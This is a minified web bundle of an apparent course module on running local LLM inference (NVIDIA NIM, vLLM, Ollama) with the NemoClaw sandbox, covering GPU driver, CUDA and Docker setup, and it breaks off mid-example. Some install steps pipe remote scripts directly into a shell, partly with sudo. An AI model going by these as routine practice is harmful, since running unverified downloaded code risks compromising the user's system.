import{j as e}from"./vendor-ui-CH8DsIbj.js";import{D as r,C as t,N as a,a as n,W as s,S as i,E as o,R as l}from"./subject-01-BuJl_oeA.js";import"./vendor-react-DsRxi-pb.js";const T={id:"08-advanced",title:"Advanced Topics & Ecosystem",icon:"🔬",colorHex:"#1565C0",description:"Local GPU inference with NVIDIA NIM, custom blueprints, advanced OpenShell configuration, and contributing to NemoClaw.",difficulty:"advanced",estimatedHours:5,prerequisites:["06-cloud-setup","07-applications"],chapters:[{id:"c1-local-inference",title:"Local Inference with NVIDIA NIM",description:"Running models locally with NIM, vLLM, and Ollama.",estimatedMinutes:60,sections:[{id:"s1-nvidia-nim",title:"What is NVIDIA NIM?",difficulty:"intermediate",readingMinutes:10,description:"NVIDIA NIM container deployment and NemoClaw integration."},{id:"s2-local-gpu-setup",title:"Local GPU Setup",difficulty:"intermediate",readingMinutes:12,description:"NVIDIA driver, CUDA toolkit, and Container Toolkit installation."},{id:"s3-vllm-integration",title:"vLLM Integration",difficulty:"advanced",readingMinutes:12,description:"PagedAttention, Docker setup, and multi-GPU parallelism."},{id:"s4-ollama-lightweight",title:"Ollama for Lightweight Models",difficulty:"beginner",readingMinutes:10,description:"Ollama installation and NemoClaw configuration."},{id:"s5-performance-tuning",title:"Performance Tuning",difficulty:"advanced",readingMinutes:15,description:"GPU memory, KV cache, quantization, and benchmarking."}]},{id:"c2-custom-blueprints",title:"Custom Blueprints",description:"Creating, versioning, and distributing custom blueprints.",estimatedMinutes:45,sections:[{id:"s1-blueprint-anatomy",title:"Blueprint Anatomy",difficulty:"intermediate",readingMinutes:12,description:"Directory structure, blueprint.yaml reference, and resolution chain."},{id:"s2-creating-blueprints",title:"Creating Custom Blueprints",difficulty:"advanced",readingMinutes:12,description:"Step-by-step blueprint creation and testing."},{id:"s3-versioning-distribution",title:"Versioning & Distribution",difficulty:"advanced",readingMinutes:10,description:"Semver, digest signing, and registry publishing."},{id:"s4-community-blueprints",title:"Community Blueprints",difficulty:"intermediate",readingMinutes:10,description:"Discovering, auditing, and contributing community blueprints."}]},{id:"c3-openshell-advanced",title:"OpenShell Advanced",description:"Deep dives into Landlock, seccomp, and network namespaces.",estimatedMinutes:50,sections:[{id:"s1-landlock-deep-dive",title:"Landlock Deep Dive",difficulty:"advanced",readingMinutes:15,description:"Ruleset layering, path hierarchy, and ABI versions."},{id:"s2-custom-seccomp",title:"Custom Seccomp Profiles",difficulty:"advanced",readingMinutes:12,description:"strace profiling and custom JSON profile writing."},{id:"s3-network-advanced",title:"Network Namespace Advanced",difficulty:"advanced",readingMinutes:12,description:"Multi-namespace bridges, custom routing, and traffic shaping."},{id:"s4-debugging-isolation",title:"Debugging Isolation Issues",difficulty:"advanced",readingMinutes:12,description:"strace, nsenter, and systematic debugging workflows."}]},{id:"c4-contributing",title:"Contributing to NemoClaw",description:"Repository structure, issues, PRs, and community.",estimatedMinutes:35,sections:[{id:"s1-repo-structure",title:"Repository Structure",difficulty:"intermediate",readingMinutes:10,description:"Monorepo layout, Makefile targets, and dev prerequisites."},{id:"s2-filing-issues",title:"Filing Issues",difficulty:"beginner",readingMinutes:8,description:"Bug reports, feature requests, and security disclosure."},{id:"s3-contributing-code",title:"Contributing Code",difficulty:"intermediate",readingMinutes:10,description:"Fork, branch, commit workflow and CI requirements."},{id:"s4-community-discord",title:"Community & Discord",difficulty:"beginner",readingMinutes:7,description:"Discord channels, help-seeking, and community events."}]}]};function c(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"NVIDIA NIM: Local Inference Microservices"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Throughout this course, we have primarily used cloud-hosted LLM endpoints -- services like the NVIDIA API Catalog or third-party providers -- to power the language models behind our NemoClaw-sandboxed agents. Cloud endpoints are convenient, but they introduce latency, ongoing costs, data residency concerns, and a dependency on external infrastructure. For production deployments where these factors matter, NVIDIA NIM (NVIDIA Inference Microservices) offers a compelling alternative: run the same models locally on your own GPU hardware, with the same API interface, but with full control over the infrastructure."}),e.jsx(r,{term:"NVIDIA NIM",definition:"NVIDIA Inference Microservices (NIM) is a set of optimized, containerized inference runtimes that allow you to deploy NVIDIA-accelerated AI models on your own infrastructure. Each NIM container packages a model with its inference engine (typically TensorRT-LLM), an OpenAI-compatible API server, and all necessary dependencies into a single Docker container that can run on any NVIDIA GPU system.",example:"Deploying a Llama 3.1 70B NIM container on a local workstation with two NVIDIA A6000 GPUs, then pointing NemoClaw's LLM configuration at localhost:8000 instead of a cloud endpoint.",seeAlso:["TensorRT-LLM","Local Inference","Model Deployment"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"What NVIDIA NIM Actually Is"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"At its core, a NIM container is a self-contained inference server. When you pull a NIM container image from NVIDIA's NGC registry, you are getting a Docker image that bundles together several components: the model weights (or a mechanism to download them on first run), the TensorRT-LLM inference engine optimized for NVIDIA GPUs, an API server that exposes an OpenAI-compatible chat completions endpoint, health check endpoints for orchestration, and performance monitoring hooks. The container starts up, loads the model onto your GPU(s), and begins serving requests on a local port."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The key design principle of NIM is that it presents the same API interface as cloud-hosted models. If your application is currently calling an OpenAI-compatible endpoint at api.nvidia.com, switching to a local NIM deployment requires changing only the base URL and potentially the API key. No code changes, no schema differences, no new client libraries. This is critical for NemoClaw integration because NemoClaw's LLM configuration is already endpoint-based -- you simply point it at a different URL."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"How NIM Enables Local Model Deployment"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Before NIM, deploying a model locally meant manually assembling an inference stack: downloading model weights, installing a serving framework, configuring GPU memory allocation, optimizing batch sizes, and troubleshooting CUDA compatibility issues. NIM abstracts all of this into a single docker run command. The container handles model loading, GPU memory management, request batching, and concurrent request handling internally."}),e.jsx(t,{language:"bash",title:"Pulling and running a NIM container",children:`# Authenticate with NGC registry
docker login nvcr.io
# Username: $oauthtoken
# Password: <your NGC API key>

# Pull and run a Llama 3.1 8B NIM
docker run -it --rm \\
  --gpus all \\
  --name llama-nim \\
  -e NGC_API_KEY=<your-key> \\
  -p 8000:8000 \\
  nvcr.io/nim/meta/llama-3.1-8b-instruct:latest

# The container will download model weights on first run,
# optimize them for your specific GPU architecture,
# and start serving on port 8000.`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Once the NIM container is running, it exposes an OpenAI-compatible API at the configured port. You can test it with a simple curl command to confirm it is operational before wiring it into NemoClaw."}),e.jsx(t,{language:"bash",title:"Testing the local NIM endpoint",children:`curl -s http://localhost:8000/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "meta/llama-3.1-8b-instruct",
    "messages": [{"role": "user", "content": "Hello, are you running locally?"}],
    "max_tokens": 64
  }' | jq .`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Integrating NIM with NemoClaw"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw's configuration system supports specifying a custom LLM endpoint. When using NIM, you configure the endpoint to point at your local NIM container instead of a remote API. This is done through the blueprint's configuration or through environment variables at runtime."}),e.jsx(t,{language:"yaml",title:"NemoClaw blueprint configuration for local NIM",children:`# blueprint.yaml
llm:
  provider: "openai-compatible"
  base_url: "http://localhost:8000/v1"
  model: "meta/llama-3.1-8b-instruct"
  api_key: "not-needed-for-local"  # NIM does not require an API key locally
  timeout: 30
  max_retries: 2

# When running NIM on a separate machine on your network:
# base_url: "http://192.168.1.100:8000/v1"`}),e.jsx(a,{type:"info",title:"Network Policy Considerations for Local NIM",children:e.jsx("p",{children:"When running NIM locally on the same machine as the NemoClaw sandbox, the agent needs network access to localhost:8000 (or whatever port NIM is configured on). Your network policy must whitelist this endpoint. If NIM runs on a separate machine, whitelist that machine's IP address and port. Remember that NemoClaw's deny-by-default policy applies even to local network addresses -- nothing is reachable unless explicitly allowed."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Available NIM Models"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NVIDIA offers NIM containers for a wide range of models. The available catalog includes models from Meta (Llama family), Mistral, Google (Gemma), Microsoft (Phi), and others. Each NIM container is optimized for specific GPU architectures and VRAM configurations. Not every model will run on every GPU -- larger models like Llama 3.1 70B require multiple high-VRAM GPUs, while smaller models like Llama 3.1 8B can run on a single consumer GPU with 24 GB of VRAM."}),e.jsx(n,{title:"NIM Model Requirements (Approximate)",headers:["Model","Min VRAM","Recommended GPU","Typical Throughput"],rows:[["Llama 3.1 8B","16 GB","1x RTX 4090 / A5000","~40 tokens/sec"],["Llama 3.1 70B","2x 48 GB","2x A6000 / H100","~15 tokens/sec"],["Mistral 7B","16 GB","1x RTX 4090 / A5000","~50 tokens/sec"],["Phi-3 Mini","8 GB","1x RTX 3080 / A4000","~60 tokens/sec"]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Advantages of Local NIM Deployment"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Data Privacy:"})," All inference happens on your hardware. No data leaves your network. This is critical for enterprises handling sensitive code, proprietary data, or regulated workloads where sending data to external APIs is prohibited by policy or regulation."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Latency:"})," Local inference eliminates network round-trip time. For agents that make many sequential LLM calls, the cumulative latency savings can be substantial -- often reducing total task completion time by 30-50%."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Cost Predictability:"})," After the initial GPU hardware investment, inference costs are fixed. There are no per-token charges, no rate limits, and no surprise bills. For high-volume deployments, this is often significantly cheaper than cloud API pricing."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Availability:"})," No dependency on external service uptime. Your agents continue to function even during cloud provider outages. This is particularly valuable for critical infrastructure monitoring agents that must operate continuously."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Customization:"})," NIM supports deploying fine-tuned model variants. If you have customized a model for your specific use case, you can serve it through NIM with the same optimized inference stack."]})]}),e.jsx(s,{title:"GPU Hardware Requirements",children:e.jsx("p",{children:"Running NIM locally requires NVIDIA GPUs with sufficient VRAM for your chosen model. Consumer GPUs like the RTX 4090 (24 GB VRAM) can handle 7-8B parameter models comfortably, but larger models require professional-grade GPUs (A6000, H100) or multi-GPU setups. Ensure your hardware meets the minimum requirements before attempting deployment, as insufficient VRAM will cause the container to fail during model loading with out-of-memory errors."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NVIDIA NIM provides the most performant path to local inference for NemoClaw deployments. In the next section, we will cover the prerequisite steps for setting up your local GPU environment -- installing drivers, CUDA, and the container toolkit -- before you can run NIM or any other local inference solution."})]})}const _=Object.freeze(Object.defineProperty({__proto__:null,default:c},Symbol.toStringTag,{value:"Module"}));function d(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Setting Up Local GPU for Inference"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Before you can run any local inference engine -- whether NVIDIA NIM, vLLM, or Ollama -- your system needs a properly configured GPU stack. This means installing the NVIDIA driver, the CUDA toolkit, and the NVIDIA Container Toolkit so that Docker containers can access your GPU hardware. This section walks through each layer of the stack, explains what it does, and provides verification steps to confirm everything is working correctly."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The GPU software stack is layered: the NVIDIA kernel driver at the bottom communicates directly with the hardware, CUDA provides the programming API that inference engines use, and the Container Toolkit bridges Docker's container runtime with the GPU driver so that containers can access GPU resources. Each layer depends on the one below it, and version compatibility between layers matters."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Step 1: Install the NVIDIA Driver"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NVIDIA driver is the kernel module that enables your operating system to communicate with the GPU. Without it, the GPU is invisible to software. For inference workloads, you need a relatively recent driver version -- generally 535 or newer for current model frameworks."}),e.jsxs(i,{number:1,title:"Check for existing NVIDIA driver",children:[e.jsx("p",{children:"Before installing, check whether a driver is already present. Many Linux distributions ship with the nouveau open-source driver, which does not support CUDA and must be replaced with NVIDIA's proprietary driver."}),e.jsx(t,{language:"bash",children:`# Check if NVIDIA driver is installed
nvidia-smi

# If this command succeeds, note the driver version
# and CUDA version shown in the top-right corner.
# If it fails with "command not found", proceed with installation.`})]}),e.jsxs(i,{number:2,title:"Install the NVIDIA driver on Ubuntu/Debian",children:[e.jsx(t,{language:"bash",children:`# Update package lists
sudo apt update

# Install the recommended driver automatically
sudo ubuntu-drivers install

# Alternatively, install a specific version:
sudo apt install nvidia-driver-550

# Reboot is required after driver installation
sudo reboot`}),e.jsx("p",{children:"On RHEL/CentOS/Fedora systems, the process differs slightly -- you will typically use the NVIDIA CUDA repository or the RPM Fusion repository. On Arch Linux, the nvidia package from the official repositories is the standard path."})]}),e.jsx(i,{number:3,title:"Verify the driver installation",children:e.jsx(t,{language:"bash",children:`# After reboot, verify the driver is loaded
nvidia-smi

# Expected output includes:
# - Driver Version (e.g., 550.120)
# - CUDA Version (e.g., 12.4) -- this is the max CUDA version the driver supports
# - GPU name, temperature, memory usage, power consumption

# Check the driver module is loaded in the kernel
lsmod | grep nvidia`})}),e.jsx(a,{type:"info",title:"Driver Version vs. CUDA Version",children:e.jsx("p",{children:'The nvidia-smi output shows a "CUDA Version" in the top-right corner. This is the maximum CUDA version that the driver supports -- it does not mean CUDA is installed. You still need to install the CUDA toolkit separately. The driver and CUDA toolkit versions must be compatible: a driver that reports CUDA 12.4 support can run any CUDA toolkit version up to 12.4.'})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Step 2: Install the CUDA Toolkit"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The CUDA toolkit provides the libraries and tools that GPU-accelerated applications need. While many containerized inference engines bundle their own CUDA libraries inside the container, having CUDA installed on the host is useful for verification, debugging, and running non-containerized tools."}),e.jsx(i,{number:4,title:"Install CUDA toolkit",children:e.jsx(t,{language:"bash",children:`# Add the NVIDIA CUDA repository (Ubuntu 22.04 example)
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/cuda-keyring_1.1-1_all.deb
sudo dpkg -i cuda-keyring_1.1-1_all.deb
sudo apt update

# Install the CUDA toolkit (this installs libraries, not a new driver)
sudo apt install cuda-toolkit-12-4

# Add CUDA to your PATH
echo 'export PATH=/usr/local/cuda/bin:$PATH' >> ~/.bashrc
echo 'export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH' >> ~/.bashrc
source ~/.bashrc`})}),e.jsx(i,{number:5,title:"Verify CUDA installation",children:e.jsx(t,{language:"bash",children:`# Check CUDA compiler version
nvcc --version

# Expected output: release 12.4 (or your installed version)

# Run a simple CUDA sample to verify GPU compute works
# (if cuda-samples are installed)
cd /usr/local/cuda/samples/1_Utilities/deviceQuery
sudo make
./deviceQuery

# This should list your GPU(s) and report "Result = PASS"`})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Step 3: Install Docker and the NVIDIA Container Toolkit"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NVIDIA Container Toolkit (formerly nvidia-docker2) enables Docker containers to access the host's GPU. Without it, running docker run --gpus all will fail because Docker has no native understanding of NVIDIA GPUs. The Container Toolkit installs a custom runtime hook that maps the GPU driver, device files, and CUDA libraries into containers at launch time."}),e.jsx(i,{number:6,title:"Install Docker (if not already present)",children:e.jsx(t,{language:"bash",children:`# Install Docker using the official convenience script
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Add your user to the docker group to avoid needing sudo
sudo usermod -aG docker $USER
newgrp docker

# Verify Docker is working
docker run hello-world`})}),e.jsx(i,{number:7,title:"Install the NVIDIA Container Toolkit",children:e.jsx(t,{language:"bash",children:`# Configure the repository
curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey \\
  | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg

curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list \\
  | sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' \\
  | sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list

sudo apt update

# Install the toolkit
sudo apt install -y nvidia-container-toolkit

# Configure Docker to use the NVIDIA runtime
sudo nvidia-ctk runtime configure --runtime=docker

# Restart Docker to apply changes
sudo systemctl restart docker`})}),e.jsx(i,{number:8,title:"Verify GPU access from Docker",children:e.jsx(t,{language:"bash",children:`# Run nvidia-smi inside a container
docker run --rm --gpus all nvidia/cuda:12.4.0-base-ubuntu22.04 nvidia-smi

# This should show the same nvidia-smi output as running on the host.
# If it works, your GPU stack is fully configured and ready for
# NIM, vLLM, Ollama, or any other containerized inference engine.`})}),e.jsx(s,{title:"Common Pitfall: Secure Boot",children:e.jsx("p",{children:`If your system has Secure Boot enabled, the NVIDIA kernel module may fail to load because it is not signed with a trusted key. You will see nvidia-smi fail with "NVIDIA-SMI has failed" or the driver module will not appear in lsmod output. Solutions include: enrolling the NVIDIA module signing key in your system's MOK (Machine Owner Key) database using mokutil, or disabling Secure Boot in BIOS. The Ubuntu installer usually prompts for MOK enrollment during driver installation -- do not skip this step.`})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Complete Verification Checklist"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"After completing all installation steps, run through this checklist to confirm your system is ready for local inference:"}),e.jsx(t,{language:"bash",title:"Full verification script",children:`#!/bin/bash
echo "=== NVIDIA Driver ==="
nvidia-smi --query-gpu=name,driver_version,memory.total --format=csv,noheader
echo ""

echo "=== CUDA Toolkit ==="
nvcc --version 2>/dev/null || echo "CUDA toolkit not installed (optional for containers)"
echo ""

echo "=== Docker ==="
docker --version
echo ""

echo "=== NVIDIA Container Toolkit ==="
docker run --rm --gpus all nvidia/cuda:12.4.0-base-ubuntu22.04 nvidia-smi > /dev/null 2>&1 \\
  && echo "GPU access from Docker: OK" \\
  || echo "GPU access from Docker: FAILED"
echo ""

echo "=== GPU Details ==="
nvidia-smi --query-gpu=name,memory.total,memory.free,temperature.gpu --format=csv`}),e.jsx(a,{type:"info",title:"Headless Servers and SSH",children:e.jsx("p",{children:'If you are setting up a headless server (no monitor attached), the NVIDIA driver installation is the same, but you should install the "server" driver variant which omits X11/display components. On Ubuntu, use nvidia-driver-550-server instead of nvidia-driver-550. Also ensure that the GPU is set to persistence mode with nvidia-smi -pm 1 to avoid the overhead of driver initialization on each inference request.'})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"With the GPU stack fully configured and verified, you are ready to deploy inference engines. The next sections cover three options: vLLM for high-throughput production workloads, Ollama for lightweight development and testing, and performance tuning techniques that apply to all local inference setups."})]})}const M=Object.freeze(Object.defineProperty({__proto__:null,default:d},Symbol.toStringTag,{value:"Module"}));function u(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"vLLM: High-Throughput Inference Engine"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"vLLM is an open-source, high-throughput inference engine for large language models that has rapidly become one of the most popular choices for self-hosted model serving. Its headline innovation is PagedAttention, a memory management technique inspired by operating system virtual memory that dramatically improves GPU memory utilization during inference. For NemoClaw deployments that need to serve multiple concurrent agent sessions against a local model, vLLM offers throughput that often exceeds what you get from other serving solutions by 2-4x."}),e.jsx(r,{term:"vLLM",definition:"An open-source library for fast LLM inference and serving, developed at UC Berkeley. vLLM uses PagedAttention to manage the key-value (KV) cache efficiently, enabling near-optimal GPU memory utilization and high throughput for concurrent requests. It exposes an OpenAI-compatible API server out of the box.",example:"Running vLLM to serve Llama 3.1 8B on a single GPU, handling 20+ concurrent NemoClaw agent requests with continuous batching, achieving 3x the throughput of a naive HuggingFace inference setup.",seeAlso:["PagedAttention","KV Cache","Continuous Batching"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Why vLLM for NemoClaw"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw agents make frequent, sequential LLM calls during their operation. A single agent task might involve dozens of inference requests as the agent plans, executes, evaluates results, and iterates. In multi-agent deployments, multiple sandboxed agents may share a single inference endpoint. This pattern demands an inference engine that handles concurrent requests efficiently, minimizes latency for sequential calls, and makes maximum use of available GPU memory."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"vLLM excels at exactly this pattern. Its continuous batching mechanism groups incoming requests together dynamically, even if they arrive at different times and have different sequence lengths. PagedAttention eliminates the memory waste that occurs in naive implementations where each request reserves a contiguous block of GPU memory for its KV cache -- instead, memory is allocated in small pages and shared where possible."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Setting Up vLLM"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"vLLM can be installed either as a Python package or run as a Docker container. For NemoClaw integration, the Docker approach is recommended because it isolates the inference engine from the rest of your system and ensures consistent dependency management."}),e.jsx(t,{language:"bash",title:"Running vLLM via Docker",children:`# Pull the official vLLM Docker image
docker pull vllm/vllm-openai:latest

# Run vLLM serving Llama 3.1 8B Instruct
docker run -d \\
  --name vllm-server \\
  --gpus all \\
  -v ~/.cache/huggingface:/root/.cache/huggingface \\
  -p 8000:8000 \\
  --ipc=host \\
  vllm/vllm-openai:latest \\
  --model meta-llama/Llama-3.1-8B-Instruct \\
  --max-model-len 8192 \\
  --gpu-memory-utilization 0.90 \\
  --dtype auto

# The --ipc=host flag is required for shared memory between
# processes within the container.
# Model weights are cached at ~/.cache/huggingface on the host.`}),e.jsx(t,{language:"bash",title:"Alternative: pip install for non-containerized setup",children:`# Create a virtual environment
python3 -m venv vllm-env
source vllm-env/bin/activate

# Install vLLM (requires CUDA 12.1+)
pip install vllm

# Start the OpenAI-compatible API server
python -m vllm.entrypoints.openai.api_server \\
  --model meta-llama/Llama-3.1-8B-Instruct \\
  --host 0.0.0.0 \\
  --port 8000 \\
  --max-model-len 8192`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Configuring NemoClaw to Use vLLM"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Because vLLM exposes an OpenAI-compatible API, configuring NemoClaw is straightforward. The configuration is identical to using any OpenAI-compatible endpoint -- only the base URL and model name change."}),e.jsx(t,{language:"yaml",title:"NemoClaw blueprint configuration for vLLM",children:`# blueprint.yaml
llm:
  provider: "openai-compatible"
  base_url: "http://localhost:8000/v1"
  model: "meta-llama/Llama-3.1-8B-Instruct"
  api_key: "token-not-required"
  timeout: 60
  max_retries: 3

# vLLM-specific: you can pass extra parameters in requests
llm_options:
  temperature: 0.1
  max_tokens: 4096
  # vLLM supports guided decoding for structured output
  # guided_json: <schema>  # optional`}),e.jsx(t,{language:"bash",title:"Verify vLLM is serving correctly",children:`# List available models
curl http://localhost:8000/v1/models | jq .

# Test a completion
curl http://localhost:8000/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "meta-llama/Llama-3.1-8B-Instruct",
    "messages": [{"role": "user", "content": "Respond with OK if you are working."}],
    "max_tokens": 16
  }'`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Key vLLM Configuration Options"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"vLLM offers numerous configuration parameters that affect performance, memory usage, and behavior. The most important ones for NemoClaw deployments are:"}),e.jsx(n,{title:"Essential vLLM Configuration Parameters",headers:["Parameter","Default","Description"],rows:[["--gpu-memory-utilization","0.90","Fraction of GPU memory to use for model and KV cache. Higher values serve more concurrent requests but risk OOM."],["--max-model-len","Model default","Maximum sequence length (input + output). Reducing this frees memory for more concurrent requests."],["--tensor-parallel-size","1","Number of GPUs for tensor parallelism. Set to your GPU count for multi-GPU setups."],["--max-num-seqs","256","Maximum number of sequences to process in parallel. Controls concurrency."],["--dtype","auto","Model precision. Use float16 or bfloat16 to halve memory vs float32. auto selects based on model config."],["--quantization","None","Quantization method: awq, gptq, squeezellm. Reduces memory at slight quality cost."],["--enforce-eager","false","Disable CUDA graph optimization. Use for debugging or when CUDA graphs cause issues."]]}),e.jsx(s,{title:"Experimental Status in NemoClaw",children:e.jsx("p",{children:"vLLM integration with NemoClaw is currently marked as experimental. While the OpenAI-compatible API ensures basic functionality works, some advanced NemoClaw features -- such as structured output parsing and certain tool-calling formats -- may not work identically with all vLLM-hosted models. The NemoClaw team tests primarily against NVIDIA NIM and the NVIDIA API Catalog. If you encounter issues with vLLM, check the NemoClaw GitHub issues for known compatibility notes and report any new ones."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Multi-GPU and Tensor Parallelism"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"For models that do not fit on a single GPU, vLLM supports tensor parallelism -- splitting the model across multiple GPUs. This is configured with a single flag and vLLM handles the rest, including inter-GPU communication via NCCL."}),e.jsx(t,{language:"bash",title:"Running a 70B model across 4 GPUs",children:`docker run -d \\
  --name vllm-70b \\
  --gpus all \\
  -v ~/.cache/huggingface:/root/.cache/huggingface \\
  -p 8000:8000 \\
  --ipc=host \\
  vllm/vllm-openai:latest \\
  --model meta-llama/Llama-3.1-70B-Instruct \\
  --tensor-parallel-size 4 \\
  --max-model-len 4096 \\
  --gpu-memory-utilization 0.92`}),e.jsx(a,{type:"info",title:"Monitoring vLLM Performance",children:e.jsx("p",{children:"vLLM exposes Prometheus-compatible metrics at /metrics. You can scrape these with Prometheus or Grafana to monitor request throughput, latency percentiles, GPU utilization, KV cache usage, and queue depth. For NemoClaw deployments, the most important metrics to watch are the KV cache utilization (high values mean you are nearing the concurrent request limit) and the time-to-first-token latency (which directly affects agent responsiveness)."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"vLLM provides the best throughput for multi-agent NemoClaw deployments where many sandboxed agents share a single inference endpoint. For simpler setups -- development machines, single-agent testing, or rapid prototyping -- Ollama offers a more lightweight alternative, which we cover next."})]})}const D=Object.freeze(Object.defineProperty({__proto__:null,default:u},Symbol.toStringTag,{value:"Module"}));function m(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Ollama: Lightweight Local Model Running"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Not every local inference scenario demands the throughput of vLLM or the enterprise optimization of NVIDIA NIM. During development, testing, and prototyping, what you often need is the simplest possible way to get a model running locally so you can iterate quickly on your NemoClaw agent configurations without incurring cloud API costs or waiting for heavyweight inference servers to spin up. Ollama fills this niche perfectly."}),e.jsx(r,{term:"Ollama",definition:"An open-source tool that simplifies running large language models locally. Ollama packages model weights, quantization configurations, and a lightweight inference server into a single binary with a Docker-like pull-and-run workflow. It supports NVIDIA GPUs, Apple Silicon, and CPU-only inference, making it accessible on virtually any development machine.",example:"Running 'ollama run llama3.1:8b' on a laptop to start an interactive session with Llama 3.1 8B, or using 'ollama serve' to expose an OpenAI-compatible API that NemoClaw can connect to.",seeAlso:["Local Inference","Model Quantization","Development Environment"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Why Ollama for Development and Testing"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Ollama's value proposition is simplicity. Where NIM requires NGC authentication and container orchestration, and vLLM requires Python environment management and careful CUDA configuration, Ollama requires a single binary installation and a one-line command to start serving. It manages model downloads, quantization, and GPU detection automatically. For the development workflow of building and testing NemoClaw blueprints and policies, this fast iteration cycle is invaluable."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Ollama also excels at running on hardware that would be insufficient for unquantized model serving. It defaults to quantized model variants (typically Q4_0 or Q4_K_M) that reduce memory requirements by 50-75% compared to full-precision weights. A model that requires 16 GB of VRAM at float16 might need only 4-5 GB in Q4 quantization. This means you can run meaningful models on consumer hardware -- an RTX 3060 with 12 GB, an M1 MacBook with 16 GB unified memory, or even a machine with no GPU at all (though CPU inference is slow)."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Installing and Running Ollama"}),e.jsx(t,{language:"bash",title:"Installing Ollama",children:`# One-line install on Linux
curl -fsSL https://ollama.com/install.sh | sh

# On macOS, download from https://ollama.com/download
# or use Homebrew:
brew install ollama

# Verify installation
ollama --version`}),e.jsx(t,{language:"bash",title:"Pulling and running models",children:`# Pull a model (downloads and caches it locally)
ollama pull llama3.1:8b

# Run an interactive chat session
